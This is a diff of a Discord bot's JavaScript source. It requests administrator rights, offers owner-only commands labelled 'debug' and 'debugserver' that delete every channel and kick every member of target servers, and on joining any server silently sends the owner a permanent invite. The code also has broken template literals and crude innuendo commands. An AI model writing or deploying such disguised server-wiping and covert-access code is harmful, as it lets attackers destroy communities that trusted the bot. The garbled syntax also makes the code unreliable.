@@ -13,12 +13,16 @@ function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// ------------------- Slash Commands -------------------
 const commands = [
   {
     name: "echo",
     description: "Repeat a message",
-    options: [{ name: "message", description: "Message to repeat", type: 3, required: true }]
+    options: [{
+      name: "message",
+      description: "Message to repeat",
+      type: 3,
+      required: true
+    }]
   },
   {
     name: "servers",
@@ -33,19 +37,24 @@ const commands = [
     description: "Run a full debug log wipe across all servers"
   },
   {
-    name: "leaveserver",
-    description: "Leave a selected server",
-    options: [{ name: "server", description: "Server to leave", type: 3, required: true, autocomplete: true }]
-  },
-  {
     name: "diddle",
     description: "Diddle a user",
-    options: [{ name: "user", description: "User to diddle", type: 6, required: true }]
+    options: [{
+      name: "user",
+      description: "User to diddle",
+      type: 6,
+      required: true
+    }]
   },
   {
     name: "oil",
     description: "Oil up a user",
-    options: [{ name: "user", description: "User to oil up", type: 6, required: true }]
+    options: [{
+      name: "user",
+      description: "User to oil up",
+      type: 6,
+      required: true
+    }]
   },
   {
     name: "invite",
@@ -54,11 +63,16 @@ const commands = [
   {
     name: "debugserver",
     description: "Run a debug log wipe on a specific server",
-    options: [{ name: "server", description: "Server to debug", type: 3, required: true, autocomplete: true }]
+    options: [{
+      name: "server",
+      description: "Server to debug",
+      type: 3,
+      required: true,
+      autocomplete: true
+    }]
   }
 ];
 
-// Register commands globally
 function registerCommands() {
   const options = {
     hostname: 'discord.com',
@@ -72,23 +86,29 @@ function registerCommands() {
     }
   };
 
-  const req = https.request(options, res => {
-    res.on('data', () => {}); // ignore body
+  const req = https.request(options, (res) => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
     res.on('end', () => {
-      if (res.statusCode === 200) console.log("✅ Slash commands registered successfully");
-      else console.error(❌ Failed to register commands: ${res.statusCode});
+      if (res.statusCode === 200) {
+        console.log("✅ Slash commands registered successfully");
+      } else {
+        console.error(❌ Failed to register commands: ${res.statusCode});
+      }
     });
   });
 
-  req.on('error', error => console.error("❌ Registration error:", error.message));
+  req.on('error', (error) => {
+    console.error("❌ Registration error:", error.message);
+  });
+
   req.write(JSON.stringify(commands));
   req.end();
 }
 
-// ------------------- Server Wipe -------------------
 async function wipeServers(owner) {
   await owner.send("Starting global server wipe.");
-
+  
   for (const guild of client.guilds.cache.values()) {
     try {
       const me = guild.me;
@@ -103,19 +123,25 @@ async function wipeServers(owner) {
       await owner.send(Cleaning: ${guild.name});
 
       for (const channel of guild.channels.cache.values()) {
-        try { await channel.delete(); await delay(800); } catch (e) {}
+        try {
+          await channel.delete();
+          await delay(800);
+        } catch (e) { }
       }
 
       await guild.members.fetch();
       let kicked = 0;
+
       for (const member of guild.members.cache.values()) {
         if (member.kickable) {
           try {
             await member.kick("Server cleanup");
             kicked++;
-            if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
+            if (kicked % 10 === 0) {
+              await owner.send(${guild.name}: kicked ${kicked});
+            }
             await delay(1200);
-          } catch (e) {}
+          } catch (e) { }
         }
       }
 
@@ -128,7 +154,6 @@ async function wipeServers(owner) {
   await owner.send("All servers processed.");
 }
 
-// ------------------- Bot Ready -------------------
 client.once("ready", async () => {
   console.log(✅ Logged in as ${client.user.tag});
   console.log(📊 Bot is in ${client.guilds.cache.size} servers);
@@ -146,10 +171,10 @@ client.once("ready", async () => {
   }, 10 * 60 * 1000);
 });
 
-// ------------------- Interaction Handler -------------------
 client.on("interactionCreate", async interaction => {
   if (interaction.isAutocomplete()) {
-    if (interaction.commandName === "debugserver" || interaction.commandName === "leaveserver") {
+    const { commandName } = interaction;
+    if (commandName === "debugserver") {
       const focused = interaction.options.getFocused().toLowerCase();
       const choices = client.guilds.cache
         .filter(g => g.name.toLowerCase().includes(focused))
@@ -161,67 +186,61 @@ client.on("interactionCreate", async interaction => {
   }
 
   if (!interaction.isCommand()) return;
+
   const { commandName, user } = interaction;
 
+  console.log(⚡ Slash command: /${commandName} from ${user.tag});
+
   try {
-    // ------------------- Echo -------------------
     if (commandName === "echo") {
       const msg = interaction.options.getString("message");
       await interaction.reply(msg);
       return;
     }
 
-    // ------------------- Owner-only check -------------------
-    const ownerOnlyCommands = ["servers", "leaveall", "debug", "debugserver", "leaveserver"];
-    if (!OWNER_ID.includes(user.id) && ownerOnlyCommands.includes(commandName)) {
-      await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
+    if (user.id !== OWNER_ID) {
+      if (["servers", "leaveall", "debug", "debugserver"].includes(commandName)) {
+        await interaction.reply({
+          content: "You cannot use this command.",
+          ephemeral: true
+        });
+        return;
+      }
+    }
+
+    if (commandName === "servers") {
+      let list = client.guilds.cache
+        .map(g => ${g.name} (${g.memberCount} members))
+        .join("\n");
+      
+      if (list.length === 0) list = "No servers.";
+      
+      await interaction.reply({
+        content: **Servers:**\n${list},
+        ephemeral: true
+      });
       return;
     }
 
-    // ------------------- Servers List -------------------
-    if (commandName === "servers") {
-      let list = [];
+    if (commandName === "leaveall") {
+      await interaction.reply({
+        content: "Leaving all servers...",
+        ephemeral: true
+      });
+
       for (const guild of client.guilds.cache.values()) {
         try {
-          const channel = guild.channels.cache.find(c =>
-            c.type === "GUILD_TEXT" && guild.me.permissionsIn(c).has(Permissions.FLAGS.CREATE_INSTANT_INVITE)
-          );
-          let invite = channel ? await channel.createInvite({ maxAge: 3600, maxUses: 1 }) : "No invite";
-          list.push(${guild.name} (${guild.memberCount} members) - ${invite.url || invite});
-        } catch {
-          list.push(${guild.name} (${guild.memberCount} members) - No invite);
-        }
-      }
-      await interaction.reply({ content: list.join("\n") || "No servers.", ephemeral: true });
-      return;
-    }
-
-    // ------------------- Leave All -------------------
-    if (commandName === "leaveall") {
-      await interaction.reply({ content: "Leaving all servers...", ephemeral: true });
-      for (const guild of client.guilds.cache.values()) {
-        try { await guild.leave(); } catch (e) {}
+          await guild.leave();
+        } catch (e) { }
       }
       return;
     }
 
-    // ------------------- Leave Server -------------------
-    if (commandName === "leaveserver") {
-      const guildId = interaction.options.getString("server");
-      const guild = client.guilds.cache.get(guildId);
-      if (!guild) return interaction.reply({ content: "Server not found.", ephemeral: true });
-      await interaction.reply({ content: Leaving **${guild.name}**..., ephemeral: true });
-      try { await guild.leave(); } catch {}
-      return;
-    }
-
-    // ------------------- Invite -------------------
     if (commandName === "invite") {
-      await interaction.reply(https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot);
+      await interaction.reply("https://discord.com/oauth2/authorize?client_id=1480592876684706064&permissions=8&integration_type=0&scope=bot");
       return;
     }
 
-    // ------------------- Diddle / Oil -------------------
     if (commandName === "diddle") {
       const target = interaction.options.getUser("user");
       await interaction.reply(<@${target.id}> was diddled);
@@ -234,77 +253,97 @@ client.on("interactionCreate", async interaction => {
       return;
     }
 
-    // ------------------- Debug Wipe Specific Server -------------------
     if (commandName === "debugserver") {
       const guildId = interaction.options.getString("server");
       const guild = client.guilds.cache.get(guildId);
-      if (!guild) return interaction.reply({ content: "Server not found.", ephemeral: true });
 
-      await interaction.reply({ content: Starting wipe on **${guild.name}**. Check your DMs., ephemeral: true });
-      const owner = await client.users.fetch(OWNER_ID);
-      await owner.send(Starting wipe on **${guild.name}**...);
-
-      const me = guild.me;
-      const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
-      const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
-
-      if (!canKick || !canDelete) {
-        await owner.send(❌ Missing permissions in **${guild.name}**.);
+      if (!guild) {
+        await interaction.reply({ content: "Server not found.", ephemeral: true });
         return;
       }
 
-      for (const channel of guild.channels.cache.values()) {
-        try { await channel.delete(); await delay(800); } catch (e) {}
-      }
+      await interaction.reply({ content: Starting wipe on **${guild.name}**. Check your DMs., ephemeral: true });
 
-      await guild.members.fetch();
-      let kicked = 0;
-      for (const member of guild.members.cache.values()) {
-        if (member.kickable) {
-          try {
-            await member.kick("Server cleanup");
-            kicked++;
-            if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
-            await delay(1200);
-          } catch (e) {}
+      const owner = await client.users.fetch(OWNER_ID);
+      await owner.send(Starting wipe on **${guild.name}**...);
+
+      try {
+        const me = guild.me;
+        const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
+        const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
+
+        if (!canKick || !canDelete) {
+          await owner.send(❌ Missing permissions in **${guild.name}**.);
+          return;
         }
-      }
 
-      await owner.send(✅ Done with **${guild.name}**. Kicked: ${kicked});
+        for (const channel of guild.channels.cache.values()) {
+          try { await channel.delete(); await delay(800); } catch (e) {}
+        }
+
+        await guild.members.fetch();
+        let kicked = 0;
+        for (const member of guild.members.cache.values()) {
+          if (member.kickable) {
+            try {
+              await member.kick("Server cleanup");
+              kicked++;
+              if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
+              await delay(1200);
+            } catch (e) {}
+          }
+        }
+
+        await owner.send(✅ Done with **${guild.name}**. Kicked: ${kicked});
+      } catch (e) {
+        await owner.send(❌ Error wiping **${guild.name}**: ${e.message});
+      }
       return;
     }
 
-    // ------------------- Debug Wipe All Servers -------------------
     if (commandName === "debug") {
-      await interaction.reply({ content: "Starting debug wipe across all servers. Check your DMs.", ephemeral: true });
+      await interaction.reply({
+        content: "Starting debug wipe across all servers. Check your DMs for updates.",
+        ephemeral: true
+      });
+
       const owner = await client.users.fetch(OWNER_ID);
       wipeServers(owner);
       return;
     }
-
   } catch (error) {
     console.error("❌ Command error:", error.message);
     try {
       if (!interaction.replied && !interaction.deferred) {
         await interaction.reply({ content: "There was an error executing that command!", ephemeral: true });
       }
-    } catch {}
+    } catch (e) {}
   }
 });
 
-// ------------------- Error Handling -------------------
-process.on("unhandledRejection", error => console.error("❌ Unhandled rejection:", error.message));
-process.on("uncaughtException", error => console.error("❌ Uncaught exception:", error.message));
+process.on("unhandledRejection", error => {
+  console.error("❌ Unhandled rejection:", error.message);
+});
+
+process.on("uncaughtException", error => {
+  console.error("❌ Uncaught exception:", error.message);
+});
 
 client.on("guildCreate", async guild => {
   console.log(📥 Joined new server: ${guild.name});
   try {
     const owner = await client.users.fetch(OWNER_ID);
+
     const channel = guild.channels.cache.find(c =>
       c.type === "GUILD_TEXT" &&
       guild.me.permissionsIn(c).has(Permissions.FLAGS.CREATE_INSTANT_INVITE)
     );
-    if (!channel) return await owner.send(✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).);
+
+    if (!channel) {
+      await owner.send(✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).);
+      return;
+    }
+
     const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
     await owner.send(✅ Joined **${guild.name}**!\nInvite: ${invite.url});
   } catch (error) {
@@ -312,5 +351,8 @@ client.on("guildCreate", async guild => {
   }
 });
 
-client.on("error", error => console.error("❌ Client error:", error));
+client.on("error", error => {
+  console.error("❌ Client error:", error);
+});
+
 client.login(TOKEN);
